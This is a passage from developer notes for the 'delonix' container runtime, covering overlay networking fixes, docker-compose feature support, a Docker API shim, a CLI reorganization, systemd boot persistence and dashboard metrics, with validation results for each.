  removed from the mesh with the crypto channel UP. That third one was in no list and is what
  had security relevance. Order: **dataplane first, record last** — if the FDB
  fails, the record still lists the peer and the next plane proposes the removal again; the other way around,
  the information about what remained to undo would be lost. A holder that is DOWN is the only case treated as
  success (the uplink lives in the ephemeral netns and died with it), and **it is said out loud**.
  - **`peer_fdb_dst` and `Network::vxlan_dev()` are the sole owners of two rules.** The first
    ("`wgIp` if encrypted, else `nodeIp`") lived only inside `realize_overlay`, and duplicating it
    would delete the WRONG entry — the removed peer receiving traffic and one that should stay without
    receiving it. The second is HEX (`dlxvx002a` for VNI 42): I wrote `format!("dlxvx{vni}")` in
    the first version and the deletion would have gone to a nonexistent device, reporting success.
  - **PRE-EXISTING BUG that only the inverse revealed: the ADD side never touched the dataplane.** The
    `add_overlay_peer` writes the record and nothing else — whoever seeds the FDB is `realize_overlay`,
    which only runs on `create`. Measured: adding peers by manifest left them in the record and
    OUT of the FDB, with `inspect` swearing the overlay reached them. It re-seeds with the
    FINAL list (`do_vxlan` only adds what is missing), which in passing restores what a holder respawn
    may have taken.
  - **Validated live, all three layers** (isolated root, against `bridge fdb show` and `wg show`, and
    not against what the command said): cleartext overlay (VNI 42) — a removed peer leaves the FDB and the
    record, added peers enter the FDB, and the substring trap exercised with
    `10.0.0.5` and `10.0.0.50` coexisting (removing `.5` leaves `.50`; a `contains` took
    both); ENCRYPTED overlay (VNI 77, interface `wgo00004d`) — the peer disappears from `wg show`, the
    FDB and the record. **Still unmeasured**: that traffic to the removed node actually stops
    flowing: that needs two real nodes, and what is proven is the mechanics.
  Whereas `macvlan`/`ipvlan` only stay in the
  `NetworkStore` and `create` **WARNS loudly** that the network was NOT realized (Realized=False,
  reason=DriverNotImplemented) instead of faking success — their physical plane needs
  CAP_NET_ADMIN in the host's init-netns, which the rootless model does not have.
  **"Realizable" is not "realized", and the `Realized` condition answered the second question with the
  first**: it came entirely out of the YAML — `False` because the document said `macvlan`, never because
  anyone had looked at the machine. A network whose `NetDef` does not exist (an `rm` halfway, an
  `ingress/` cleaned up) reported `Realized=True`, `stack plan` said "no changes", `network ls`
  showed it with bridge and subnet, and `container run --net <name>` failed with "does
  not exist" — measured live. It now reads the `NetDef` (via `Env`, probed ONCE per plan) and
  **deliberately NOT the bridge**: this lives in the ephemeral netns and on an idle node does not exist, so
  probing it would by default make the whole network look healthy — the trap that made `NetworkRoute` plan
  against the record. It enters as a CONDITION and not as a compared field, because a field would give a diff →
  `Replace` → and a network replace disconnects every container attached to it; and it is skipped on a
  `Create`, where the network is being built by that same apply.
  **`network_create_with_gateway` silently discarded the PREFIX** when the `NetDef` already existed
  (the gateway had already been fixed before, the prefix had not): it gave a `network inspect` showing subnet
  A with containers receiving addresses from subnet B. It now REFUSES — there may be workloads already
  attached with leases from the registered prefix, and changing the bridge under them is not a `create`'s
  decision.
- **NETWORK storage (NFS/CIFS-SMB/WebDAV)**, mountable as a volume, k8s PersistentVolume style
  — `delonix volume create --type <nfs|cifs|smb|webdav>` (see the `delonix volume` bullet
  above) + `kind: Volume` with an `nfs:`/`cifs:`/`webdav:` block. A folder on a NAS (TrueNAS/
  Synology/Nextcloud) becomes a named volume that any container mounts with `-v <name>:/x`. Underneath
  it is a `delonix-volume` volume with a network driver (the `ensure_mounted` mounts via
  `mount -t nfs|cifs|davfs`); the friendly declaration (server/share/credentials) is translated into the
  device/options by `storage::build_mount`. Password via vault (`--password-secret` → `password`
  key of the secret). Validated end-to-end with real NFS: a container READ and WROTE on a network
  volume and the write reached the NAS (see `examples/storage.yaml` + `examples/nas-vm-cloud-config.yaml`,
  the recipe for the Samba+NFS validation VM). **Mounting NFS/CIFS needs CAP_SYS_ADMIN** (root or
  privileged session) — in pure rootless `mount -t` fails clearly.
- `delonix net httproute` — ls/apply/rm of the **L7/HTTP reverse-proxy** (`kind: HTTPRoute`). See the
  "L7 Reverse-proxy" section below. **Do not confuse** with `delonix net ingress` (L4 inbound firewall).
- `delonix stack apply [-f delonix-manifest.yaml]` — see the "Manifest/apply" section below.
- `delonix compose up|down|ps|logs|config [-f <file>] [-p <project>]` (v0.29.0) — NATIVE
  support for `docker-compose.yml` (Compose Spec v2.x), `cmd/compose.rs`. A foreign-schema
  translator, of the same family as `container::pod_to_run_opts` (k8s Pod) and
  `dockerapi::docker_config_to_run_opts` (Docker API): a hand-typed parser (no new
  dependency), translated directly to `RunOpts` (containers, reusing `cmd_run` as-is)
  or to `ManifestDoc`s that reuse `image`/`network`/`volume::apply` verbatim (same
  idempotency, same input hardening, zero duplicated creation logic). **`depends_on`** with
  the 3 conditions (`service_started`/`service_healthy`/`service_completed_successfully`) via
  topological ordering of the service graph (cycle → clear error, never an arbitrary order) +
  waiting for the real healthcheck (the service's inline one or the image's own) — with no change
  to the engine/store schema. **Project** (`compose down/ps/logs`) = label
  `delonix.io/compose-project=<name>` on the containers (same idea as `pod.rs`'s `POD_LABEL`);
  networks/volumes have no labels field, so they use DETERMINISTIC naming
  (`<project>_<name>`, the same convention as real `docker compose`) — `down` reconstructs the
  same names from the compose file (re-parsed), with no store of its own, same philosophy
  as `stack describe`/`cluster ls`. **Validated live end-to-end** (Postgres+app): `web`
  only started after the `db`'s `pg_isready` really succeeded; `compose down -v` removed the 2
  containers + network + volume leaving nothing behind; `up` idempotent on a 2nd call.
  **DONE (2026-07-27)**: `working_dir:` — gained `container run -w/--workdir` (a gap in the whole
  engine, not just compose: `RunOpts`/`Container` never had a workdir override at creation,
  only `exec -w` already had a per-call one; `c.workdir` was already applied in the init's `chdir()` before
  the `execve`, only a way to set it from outside the image was missing). `compose` now
  uses `RunOpts.workdir`. Validated live: `working_dir: /opt/app` → `pwd` inside the container
  confirms `/opt/app`. **DONE (2026-07-27)**: a port with no explicit host (`ports: ["80"]`, short
  and long forms) — instead of refusing, it assigns a free host port (`free_host_port`, bind to
  port 0 + release immediately; inherent and accepted TOCTOU, the same technique any random
  port assignment uses). Validated live: `compose up` with `ports: ["80"]` did publish on
  a real free port, confirmed by `container port`.
  **DONE — `profiles:`** (`up --profile <name>`, repeatable) — a service with no `profiles:`
  always runs; one that declares any only starts if the profile is requested, **or** if an
  ACTIVE service reaches it via `depends_on` — the same rule as real `docker compose` (otherwise an
  active service would be left without what `depends_on` promises). `active_services` computes the
  transitive closure; `down`/`ps`/`logs` do not need to know it, because they already derive from the
  containers REALLY created (by label), never from the compose file again.
  **DONE**: `build.target` (multi-stage stage selection) — `ComposeBuild::Full`'s `target`
  field was already parsed all along and was explicitly REFUSED
  ("not supported in v1"); it is now forwarded to the `build.target` of the generated `kind: Image`
  (the same path that `delonix build --target` uses). The real gain is not just the field —
  it is that `delonix build` itself **never had** any stage selection: it only builds ALL
  the stages and packs the last. `resolve_target_stage` (`delonix-oci::build`, pure/tested)
  resolves the requested name/index against `df.stages` or the final stage itself (which does not live in
  `df.stages` — only `df.from`/`df.steps` — hence the new `Dockerfile.last_name` to recognize it
  by name without treating it as unknown); a name/index that matches neither of the two
  refuses by naming the real stages. Only the stages up to the target (inclusive) are built —
  the later ones do not even get a container. **Fixed along the way, so that `--target`
  produces the RIGHT image and not a contaminated one**: `CMD`/`ENTRYPOINT`/`USER`/`ENV`/`WORKDIR`/
  `HEALTHCHECK` only land in `df.*` — they are not managed per stage in this parser — so a
  `--target` to an intermediate stage no longer inherits them from the final stage (sometimes NOT EVEN
  built); it instead uses the already-correct values that `final_state` brings from the target stage ITSELF
  (base image + its own steps). **Root mode (overlay) refuses `--target` to an intermediate
  stage** — fixing that would require touching `delonix-oci`'s `build_image` to accept
  the already-resolved values instead of reading raw `&df`, out of scope for this slice; targeting the final
  stage still works in both modes. **Validated live**: a 2-stage Dockerfile
  (`builder`/`runtime`, with a `COPY --from=builder`) — build without `--target` produces the image of
  `runtime` (has `runtime-only.txt`+`shared.txt`, NOT `builder-only.txt` — the normal multi-stage
  semantics); `--target builder` produces only `builder` (has `builder-only.txt`+`shared.txt`,
  NOT `runtime-only.txt` — proof that the `runtime` stage did not even run); `--target runtime`
  (the final stage's name, explicit) gives byte-for-byte the same as without the flag; a
  nonexistent name refuses by naming `builder, runtime`.
  **Separate finding, pre-existing, NOT fixed here**: a `RUN`/`COPY` that hits the cache
  (identical rebuild) closes its step with `✗` in the `Progress`, even though the build in the end
  succeeds — also reproduced WITHOUT `--target`, in a simple rebuild of the same unchanged
  Dockerfile. It is cosmetic (the final `img.short_id()` is correct) but visually misleading;
  recorded for whoever touches the steps' `Progress`/cache next.
  **DONE: `networks.*.ipv4_address` fixed** — instead of refusing, it feeds the
  SAME `container run --ip` path: `infra::attach_container_on_ip`
  reserves the chosen address in the SAME per-prefix IPAM record that
  `attach_container`'s `allocate` reads (the control line sent to the holder
  is identical — `attach <netns> <ip> <bridge> <gateway> [<ns>]`, only with a
  CHOSEN address instead of an ALLOCATED one) — it already existed, had ZERO callers,
  the same "public, dead, with a latent bug" pattern already catalogued several
  times in this file. `container run --ip` no longer refuses; it refuses only
  `--ip` without `--net <network>` (there is no SDN address at all to fix). A bug
  in LANG-01 (an error message in Portuguese inside the engine) was fixed
  along the way, by giving the function its first real call. **Validated only by
  unit test, deliberately not live**: the holder's control line
  did not change (confirmed by reading the code, not assumed), so it does not
  need a respawn — but proving the attach against a live holder was
  postponed on purpose so as not to touch this host's production network, a decision
  already made for this item. Coverage: the pure guard `fixed_ip_needs_custom_net`
  (CLI), the `ipv4_address` → `RunOpts.ip` merge (compose), and the
  pre-existing per-subnet refusal test in `delonix-sdn` (still green).
  **DONE**: `extends:` — a `service:` of a SIBLING service in the SAME file inherits the fields that
  the service itself does not declare (`resolve_extends`/`merge_service`, pure and tested), in the order
  of the Compose Spec: `image`/`build`/`command`/`entrypoint`/`working_dir`/`user`/`restart`/
  `container_name`/`hostname`/`healthcheck`/`deploy` are "the child wins if it declares, else it inherits";
  `environment:`/`labels:` MERGE key-by-key (the child wins only on the shared key, the parent's
  survive — it is not an `override` of the whole map); `cap_add`/`cap_drop` concatenate without duplicating
  an entry both declare; `ports:`/`volumes:`/`env_file:`/`tmpfs:` concatenate parent+child
  without deduplicating (documented simplification: a port published twice loses the
  `free_host_port` race and fails loudly, never silently); `privileged`/`read_only` are OR (a simple `bool`
  does not distinguish "the child said false" from "the child said nothing", so there is no way to
  disinherit a `true` from the parent — documented, not hidden). **`depends_on:` is NEVER inherited** —
  the same deliberate exclusion that the Compose Specification itself makes: a service's dependency graph
  is its own, not something that comes bundled with the configuration it reuses. Chains
  (`web` extends `mid` extends `base`) resolve transitively before anything else
  touches `services` (`load_compose` calls `resolve_extends` right after the parse, and so
  `translate`/the `depends_on` graph/`service_to_run_opts` do not need to know `extends`
  ever existed — by the time they reach it, it is already `None`), with cycle detection naming the
  whole path and not just the two ends that collided. `extends.file` is **always refused**,
  in the raw YAML check and before any typed parse — this engine does no multi-file
  compose at all, and pointing to another file without warning would be resolving against the
  wrong file silently; extends within the same file needs no `file:` at all.
  Validated live: a `web` extending `base` inherited `image`/`ONLY_BASE` from the parent, kept its
  own `ONLY_WEB`, overrode `SHARED` and `working_dir` (confirmed by `PWD=/web-dir` and by the
  environment variable read from INSIDE the running container, not just by `compose config`), and
  ended with `cap_add: NET_ADMIN, SYS_PTRACE` (one from each side, without duplicating); `base` stayed
  untouched. The three refusals (nonexistent base, cycle, `extends.file`) confirmed with the exact
  message against the real binary.
  **DONE**: `deploy.replicas` — N real containers per service
  (`<project>-<service>` for the 1st replica, `-2`/`-3`/… for the rest), **with no load
  balancing between them** — same "no VIP, no daemon" stance that `kind: Service`
  already declares for its DNS round-robin, which this v1 does not wire to the compose replicas.
  The 1st replica keeps the usual name on purpose: it is what `depends_on`/the healthcheck already
  targeted, and it is the only way for the other two capabilities to keep working without
  touching them. **Two refusals, both from a real collision**: an explicit `container_name:` with
  `replicas>1` (the replicas would all collide on that ONE name) and a FIXED host port
  (`ports: ["8080:80"]`, or the long form with `published:`) with `replicas>1` (they would all collide
  on the same port) — a port WITHOUT an explicit host is still accepted and is even the
  recommended path, because each replica calls `free_host_port` in its own turn and there is nothing
  to collide. `deploy.replicas: 0` is also refused — this v1 has no scale-to-zero/profile
  semantics for a service that is already running. `cmd_down`/`cmd_ps`/`cmd_logs`
  needed not ONE line of code: they already derive a project's container list
  from the labels (`compose-project`/`compose-service`) instead of recomputing names from the
  file, so they already saw N containers the same way they saw 1. Validated live: `deploy:
  replicas: 3` with `ports: ["80"]` did create 3 containers (`web`/`web-2`/`web-3`), each
  with ITS own random port (`container port` confirmed the three different), `compose ps`
  listed the three under the same service, and `compose down` removed the three with no
  special handling at all; the three refusals confirmed with the exact message.
  **DONE: top-level `configs:`/`secrets:`.** Each entry REFERENCED by
  at least one service (the unused ones are not even read — the same saving as a
  `networks:`/`volumes:` never attached) becomes a synthetic `kind: Secret`
  (`resolve_compose_secrets`), applied by `secret::apply` verbatim before the
  containers — zero new mechanism, the same `stringData` the manifest already
  accepted. `secrets:` reads `file:` (raw file content, relative to the compose
  directory) and `environment:` (read from the process at `up`);
  `configs:` only reads `file:` (the Compose Specification never gives it the `environment:`
  source, and giving it one here would be a second undocumented opinion).
  Each service with `secrets:`/`configs:` gains `RunOpts.secret`+
  `secret_files: true` — file delivery is the only form the Compose
  Specification promises for both, never an environment variable.
  **Documented simplification, never silent**: `Container.secret`'s
  file delivery names each mount by the secret's data KEY, with no
  per-secret retarget — so a `source:`/`target:` whose `target` DIFFERS
  from the `source` is REFUSED with the exact reason (use the source name, or drop
  `target:`), never silently mounted with the wrong name. `external: true`
  is also refused (this module only knows how to CREATE a secret from a
  `file:`/`environment:` it can read, never to reference one that already exists
  outside the compose file). Validated live (`DELONIX_ROOT`/
  `DELONIX_NET_RUNTIME_DIR` isolated): `db_password`/`nginx_conf` from two
  local files arrived intact at `/run/secrets/db_password` and
  `/run/secrets/nginx_conf` inside the container, with the expected 0600 mode.
  **DONE: anonymous volumes** (`- /container/path`, with no explicit `source`)
  — the naming/cleanup decision this paragraph asked not to be
  decided hastily: `anonymous_volume_names` gives them a re-derivable SCOPED
  name (position among the anonymous mounts OF THE SAME service, by the
  same collision-free `compose_scoped_name` that named volumes/networks already
  use) — with no store of its own, the same "reconstruct from the compose
  file" philosophy as the rest of the module. **Only `down -v` removes them; a plain
  `down` NEVER touches them** — the real behaviour of `docker compose`. Validated
  LIVE (`DELONIX_ROOT`+`DELONIX_NET_RUNTIME_DIR` isolated, without touching the
  production network): `up` creates the volume and mounts it (a write from inside the
  container shows up in `_data/` on the host side); plain `down` leaves the
  written file intact on disk; a following `down -v` deletes it.
  **DONE: multi-file (`-f a.yml -f b.yml`), repeatable across the 5 subcommands.** Each file is
  parsed and goes through `check_unsupported_fields` (the denylist/allowlist against the RAW YAML)
  **separately** — the check runs over raw text, before any merge, so
  a refused key does not escape by being in the SECOND file. The resulting typed
  `ComposeFile`s merge left-to-right (`merge_compose_files`) by the Compose Spec's own
  rules: scalars → the later file wins only if DECLARED (`Option::or`, never
  replacing with a silent default); `environment:`/`labels:`/`extra_hosts:` → merged
  KEY BY KEY (`merge_env`, converting both sides to `KEY=VALUE` before merging — one
  file never erases the other's variables just by declaring one more); `cap_add`/`cap_drop` →
  concatenated without duplicating; `ports`/`volumes`/`env_file`/`tmpfs` → concatenated. **`depends_on`
  ACCUMULATES** (`merge_depends_on`) — unlike `extends:` (which excludes it on purpose, due to
  ambiguity with a strange TEMPLATE), an ordinary multi-file of the SAME service does not have that
  ambiguity, so a dependency declared in any of the files survives the
  merge. Top-level `networks:`/`volumes:` are small (`external`/`name`) — a shared key
  is a whole REPLACE, not a field-by-field merge, a documented simplification and not a
  silent drop. Relative paths (`build` context, `env_file`) resolve against the
  FIRST file's directory, the real `docker compose`'s own convention. **Validated
  live**: a key refused only in the 2nd file still fails; without any `-f` the
  usual behaviour (looking for `compose.yaml`/`.yml`) stays byte-for-byte intact; and a
  `depends_on:` added only in the OVERRIDE file does change the topological creation
  order (two services whose alphabetical order would be the inverse of the dependency) — proof that the
  merge composes the two files for real, it does not pick one. `include:` remains **deliberately
  out of scope** (its own path-relativity and project-name propagation, which would expand the
  scope) — the refusal message points to `-f a -f b` instead.
  **To do, documented (never silent)**: only the YAML `include:` directive
  (its own rules of path-relativity and of project-name propagation — the
  command-line `-f a -f b` form is done). This list has already been written
  THREE times in parallel, each copy truncated midway by a merge
  done by the interface with nobody compiling the join. An outdated debt
  list lies in both directions.
- `delonix serve docker-api [--addr unix://<socket>]` — a slice of the **Docker Engine API** (`cmd/dockerapi.rs`)
  enough for `docker version/ps/images/info` **and**, since v0.26.0, the full life cycle of
  a container via `DOCKER_HOST=unix://<socket>`: `POST /containers/create|start|stop|kill|wait|
  restart|rename`, `DELETE /containers/{id}`, `GET /containers/{id}/json`, all delegating to the SAME
  `cmd_run`/`cmd_stop`/`cmd_kill`/etc. of the CLI (zero duplication). Deliberate simplification:
  `create` starts up immediately (no dormant "created" state) — `start` on an already-running one returns
  the idempotent **304** that real docker also returns, which keeps the `create`→`start` pair that
  `docker compose up` uses working. **`exec`/interactive attach (HTTP hijacking) is out of
  scope**. `HostConfig.RestartPolicy` **is served** (2026-09-17): it was refused because the
  supervisor does a raw `fork()` that assumes a single-threaded caller, and the startup ran in the
  multi-threaded server itself; since the `__apirun` re-exec the startup runs in a new process, and
  the argument no longer holds. The value passes through the CLI's `parse_restart_policy`, so a
  wrong name is still refused.
  **2 real bugs found and fixed while validating against a real `docker` CLI**: (1) a detached
  container that died stayed a **zombie forever** (`ps` showed `<defunct>`, `docker inspect`
  kept saying `Running`) — `spawn()` only returns without `waitpid` when `detach: true`,
  harmless in the normal CLI (the process exits right after, the orphan is reparented to the host's real
  `init`, which reaps it), but this server NEVER exits — it is the container's real parent forever, and never
  called `waitpid`; fixed with a dedicated reaper thread (`waitpid(-1, ...)` in a loop). (2) the
  **log shim** (`log_shim`, a `fork()` that never does `execve` — it runs forever copying the
  container's pipe to the log file) only closed the inherited stdio (fds 0/1/2); in long-lived cases
  like this server, it ALSO inherited the sockets of other live HTTP connections and held them
  open forever — fixed by closing everything but the source fd right after the fork
  (`libc::close_range`). **Documented limitation, non-blocking**: the convenience subcommand
  `docker run` (create+start in a single command) does not return control to the terminal reliably
  against this server (the separate `create`+`start`+`inspect`+`kill`+`wait`+`restart`+`rename`+`stop`+`rm`
  — the path `docker compose` uses — were all validated correct and instant);
  the cause appears to be internal behaviour of the Go CLI itself, not reproduced with the separate
  commands.

### Reorganization of the CLI root (v0.30.0, BREAKING, clean cut with no aliases)

A real user bug report: the `delonix` root had grown to **26 flat subcommands**
(`netns`/`flow`/`ingress`/`egress`/`httproute`/`tunnel`/`boot`/`cri`/`api`/`docker-api`/`kube`
side by side with `container`/`image`/`vm`/...) — easy to invoke a low-level subcommand
as if it were a main command by mistake. Explicit request: **deep** grouping +
**clean cut** (no backward-compatibility aliases — old names removed entirely).

- **`delonix net <x>`** (`cmd/net.rs`) groups the low-level network/infra plumbing: `netns`
  (old `delonix netns`), `flow`, `ingress`, `egress`, `httproute`, `tunnel`, `boot`. Pure
  routing — each arm delegates to the SAME `run()` as always, zero behaviour change, only the
  CLI path to reach it.
- **`delonix serve <x>`** (`cmd/serve.rs`) groups the three "serve a protocol on a unix socket":
  `cri` (old `delonix cri`), `api` (old `delonix api`), `docker-api` (old `delonix
  docker-api`).
  **Since P3k (ADR-0040 D2.4 amended), `serve cri` has no server inside `delonix`**:
  it `exec`s the `delonix-cri` binary (the one next to `delonix` first, then the
  `PATH`), with the user's `DELONIX_ROOT` and the expected version. The user only knows
  `delonix`; a `delonix-cri` from another release refuses to start; without it installed the exit is
  69 and it says `install.sh --with-cri`. **`delonix mcp` followed in P3l** (`delonix-mcp`,
  installed by default), and `serve api` in P3m (`delonix-mgmt`); `docker-api` lives in the
  binary itself (`cmd/dockerapi.rs`) and leaves when the CLI becomes a library. A
  server that runs the CLI back (the MCP mutations, the CRI life cycle) uses
  `delonix_node::dispatch::cli_bin` and NEVER the executable itself: `delonix` passes
  `DELONIX_BIN` with its own path.
- **`delonix cluster kube generate`** — the old `delonix kube generate` folded into
  `cluster` (`ClusterCmd::Kube`), being another facet of the same "Kubernetes" group that `cluster
  apply`/`cluster kubeadm` already occupy.
- `delonix ingress-proxy` (HIDDEN subcommand, the internal L7 proxy process launched inside the
  holder's netns) was left **deliberately out** of this reorganization — it is not visible clutter
  (`--help` does not list it) and touching its argv risked breaking the re-exec mechanism it already uses.
- **Old→new mapping**: `netns`→`net netns`, `flow`→`net flow`, `ingress`→`net ingress`,
  `egress`→`net egress`, `httproute`→`net httproute`, `tunnel`→`net tunnel`, `boot`→`net boot`,
  `cri`→`serve cri`, `api`→`serve api`, `docker-api`→`serve docker-api`, `kube`→`cluster kube`.
  **No aliases** — a script/pipeline that still invokes the old form fails with "unrecognized
  subcommand", not silently.
- **Internal mechanism untouched**: the holder netns and the `--net <custom-network>` re-exec
  (`container::reexec_into_netns` → `nsenter … ip netns exec`) use interception of
  RAW `std::env::args()` in `main()`, BEFORE the `clap` parsing — they literally check
  `argv[1] == "netns"`/`argv[2] == "holder"`/`"run"`. That mechanism is **completely
  independent** of the public `Cmd` enum — moving `netns` inside `Cmd::Net` does not touch
  it at all. Confirmed live: `container run --net <existing-network>` on this host still
  gains a real IP on the SDN after the reorganization.
## Surviving a reboot (`cmd/boot.rs`)

**Renamed to `delonix system boot` in B2 of the CLI restructuring plan**
(`docs/discovery/52_CLI_PLANO_MIGRACAO.md`) — the rest of this section talks about
`net boot`, the spelling of when each finding was measured, and stays as is because
it is history, not the current surface.

There is no daemon restoring state — persistence belongs to systemd, as in Podman. `net boot enable`
writes one unit per container (`ExecStart=<exe> container start <nome>`), rootless under
`~/.config/systemd/user` + `loginctl enable-linger`, root under `/etc/systemd/system`. The network infra
has no unit at all: it comes up lazily on the first `container start` (`acquire` → `ensure_up`), and
the bridges/routes/egress return when a workload connects (`ensure_net_bridge`).

Four defects fixed in a file that had not a single test, and which generates the artefact that
decides whether the machine comes back to itself:

- **DESTRUCTIVE**: the sweep was `starts_with("delonix-")`, and in root mode the directory is
  `/etc/systemd/system` — where **`delonix-cri.service`** lives. A `net boot disable` on a
  Kubernetes node disabled and DELETED the kubelet's CRI endpoint, and `status` listed it as though this
  command had generated it. Units now carry their own prefix (`delonix-boot-`), the legacy
  form remains recognized so as to clean up what an earlier version installed, and `delonix-cri.service` is
  excluded by name.
- **`--restart no` was unreachable**: the default was `always` and the ONLY branch that read the
  container's policy was `restart == "no"` — asking for `Restart=no` produced `Restart=always`. It became an `Option`,
  which separates "not given" (inherits from the container) from "given" (commands, including `no`).
- **`enable` only ever created**: a unit whose container had been removed kept its boot link and, with
  `Restart=always` recorded, failed in a LOOP on every boot. Now it prunes the obsolete ones and says which.
- **A `--restart always` container stopped by a reboot generated no unit at all**, and the gap is
  circular: the supervisor is a raw `fork()`, so the reboot kills it and the container is left `Crashed` with no
  PID; `enable` only looked at those with a live PID; and `stack apply` likewise does not bring it up
  ("already exists, nothing to do"). The criterion became "should be up" — live PID OR
  `always`/`unless-stopped` policy. It is the role of `podman-restart.service`, here with one unit per
  container. `on-failure` is left out: it means "restart if it exits badly", not "is up at
  boot".

**Closed since then**: **VMs** gained a unit (their own prefix `delonix-boot-vm-`, because a
container and a VM can have the same name in different stores; `Type=oneshot`+`RemainAfterExit` and
not `forking`, because `vm start` returns with the VMM up and there is no host process for systemd
to follow); and the **members of a pod** sit behind an anchor (the first by name) with `After=` — they
share the netns, and whoever starts first is who recreates it, so N units in parallel were racing
to be that one. `After=` and not `Requires=`: the latter would take the whole pod down with the anchor.

**Still to do**: there is no Kind that expresses boot-time persistence (13 Kinds, none says
"boot"). It is a new declarative surface and is left for the next major, which already brings boundary
changes.

## Output: docker-style `ls`, kubectl-style `describe` (`cmd/output.rs`)

All formatting goes through `cmd/output.rs` — `Table` (measures the columns by real content; previously
each group had hardcoded `{:<20}` widths and the table went out of alignment the moment a name exceeded them),
`Describe` (`kubectl`-like blocks) and `fmt_size`/`fmt_local`/`fmt_age`/`fmt_duration_secs`.
**No new dependencies** — there is no `comfy-table`/`tabled`/`chrono` in the tree and it is not worth
enlarging the supply-chain surface of a container runtime for a column aligner.

> **Deliberate exception: `ratatui` (`delonix dash`).** The interactive dashboard
> (`delonix dash` + `container/vm/network/storage/image dash`) uses `ratatui`
> (which pulls in `crossterm`) — the only UI dependency that breaks the rule above, by
> explicit decision of the user (who wanted an htop-style TUI, not a snapshot).
> It is **confined to the bin** (`delonix-runtime-bin`); the engine crates
> stay dep-clean (`cargo tree -e normal` on them does not show it). The
> `delonix dash --once` mode (ANSI text snapshot) does not use it at runtime. Recorded
> here so a future audit does not treat it as accidental — see `cmd/dash.rs`.

### Resource KPIs (RAM/network/storage) + Prometheus + `dash --json`

Direct request from the user upon seeing `delonix dash`: dynamic KPIs were missing
(RAM/network/storage consumed), the activity bar "did not say much" (only
a container count, no per-resource uptime), the dashboard came up in PT by
default (an i18n bug — never detected before), and a way to
feed Grafana/other SRE tools was missing. All of this shares ONE single
collector (`delonix-mgmt::dashstats::collect`), so the TUI, the `--json`, and the
Prometheus scrape never diverge in the arithmetic.

- **New module `delonix-mgmt::dashstats`** (`crates/interfaces/delonix-mgmt/src/
  dashstats.rs`): `pub fn collect(root, include_network, include_storage) ->
  DashSummary` — counts of containers/VMs/networks/volumes/images/secrets,
  `memory.current`/`memory.max` of the whole cgroup slice (`delonix_linux::
  slice_budget`), sum of rx/tx bytes per-container
  (`delonix_sdn::infra::container_net_bytes`, one `nsenter`+`cat` per
  running container) and disk usage per area (`blobs+layers`/`volumes`/
  `vm-images`/`containers`, recursive `dir_size` in the style of `du`, the same pattern
  as `cmd/system.rs::dir_size`/`cmd_df` — duplicated there on purpose: a
  ~10-line helper, and `delonix-mgmt` cannot depend on the `-bin` crate).
  `delonix-runtime-bin` depends on `delonix-mgmt` (never the reverse), so
  `cmd/dash.rs` calls directly into this collector instead of reimplementing
  the aggregation — single source of truth across TUI/JSON/Prometheus.
- **COST BUG found while validating live, fixed before publishing**:
  the disk sum (`storage_bytes_*`) walks `containers/` — in rootless
  each container had a full FLAT copy of the rootfs (see the "Golden VM image"
  section / the disk-pressure incident history) — measured on this host (49
  containers, several full `kindest/node` nodes): **68 GiB, over a
  minute** of disk I/O. **The per-container copy ended in v0.59.0** (see
  "Rootless containers share the layers", below) and the cost of this pass
  falls with it; the decoupling below still holds, because `containers/`
  still has the legacy copies and the `upper/` dirs are still walked. Computing this inline would block the TUI on every
  tick AND blow past the Prometheus scrape timeout (10s by default).
  Fixed with two decoupling mechanisms:
  1. `dashstats::collect` gained `include_network`/`include_storage`
     (`bool`), returning `Option<u64>` in the expensive fields when `false` — never
     a misleading "0 bytes", always an explicit `None` until there is a real measurement.
  2. **TUI** (`cmd/dash.rs::tui::run_interactive`): the 1st snapshot (before the
     terminal) only asks for the cheap fields (counts + memory — instant);
     a dedicated `std::thread` runs the full `collect(true, true)` in a loop
     (`SLOW_REFRESH = 15s` between passes) and publishes into a shared `Arc<Mutex<
     DashSummary>>`; the render's 1s tick (always cheap) merges
     the latest expensive fields from that mutex before building the tiles —
     the UI never blocks, even if the disk pass takes over a minute.
  3. **`delonix-mgmt` `/metrics`**: the handler only recomputes the cheap fields on
     each request; a task `tokio::spawn`ed once at server startup
     (`spawn_expensive_metrics_refresh`) recomputes the expensive fields every 30s
     in the background and publishes them into the shared registry — the scrape stays always
     fast (confirmed live: ~0.15s), the expensive gauges are "stale" for up to
     30s, never absent. `GET /v1/dash` (JSON, an on-demand request by a human/
     tool) still does the FULL collection inline — documented
     as potentially slow (tens of seconds), it is not a periodic scrape.
- **Prometheus, not gRPC, for Grafana**: the engine already had a shared
  Prometheus registry (`delonix-runtime-core::metrics`, `prometheus-client`
  already in the tree, used only by CRI counters) exposed at `/metrics` of
  `delonix-cri` (kubelet scrape) and of `delonix-mgmt` (control-plane
  scrape) — Grafana speaks Prometheus/REST natively, not gRPC. It gained
  new gauges: `delonix_containers_running/total`, `delonix_vms_running/
  total`, `delonix_memory_bytes_used/limit`, `delonix_network_rx/tx_bytes`,
  `delonix_storage_bytes_{images,volumes,vm_images,containers}`. `Gauge` and not
  `Counter` even for the "cumulative" bytes: the value read from the kernel IS
  monotonic, but it is summed over a DYNAMIC set of containers that can
  disappear between scrapes (shrinking the sum) — the `Counter` API only
  allows `inc`/`inc_by`, which does not serve this.
- **`delonix-mgmt` gained `GET /v1/dash`** (JSON of the same `DashSummary`) and
  came to depend on `delonix-runtime`/`delonix-vm`/`delonix-sdn` (previously only
  `delonix-volume`/`delonix-oci`/`delonix-scanner`) — the same expansion that
  `delonix-cri` had already made for an analogous reason (full visibility
  of the engine), with no circular dependency whatsoever.
- **`delonix dash --json`** (new, alongside the already-existing `--once` ANSI):
  `DashData`/`Tile`/`Row`/`Problem`/`DashScope` gained `Serialize` — a
  snapshot only, no TUI and no ANSI, for scripts/CI or a JSON datasource for
  Grafana. It reuses the usual `DashData::collect` (full collection,
  including the expensive fields) — the same cost trade-off as `--once`.
- **`UP` column in the resources table** — real per-container uptime
  (`pid_starttime` → `output::uptime_from_starttime`/`fmt_duration_secs`, the
  SAME mechanism as `container ls`), `-` for VM/network/volume/image (none
  of these stores a starttime today — not faked). Directly answers the
  user's request ("the bar does not say how long the container has been
  running").
- **Sparkline with toggling (`m` key)** — instead of just the count of
  running containers, the TUI now tracks TWO series in parallel (both
  cheap, already part of every snapshot) and the `m` key toggles which one the
  2-minute graph shows: running containers, or memory used (MiB).
- **I18N BUG found and fixed**: `cmd/dash.rs` had 100% of its user-facing text
  hardcoded in PT directly in the source — zero calls
  to `po::t`/`po::tf`, violating this repo's rule (source 100% EN, translation via
  `pt.po`) ever since the dashboard was written. Fixed: the entire dash UI
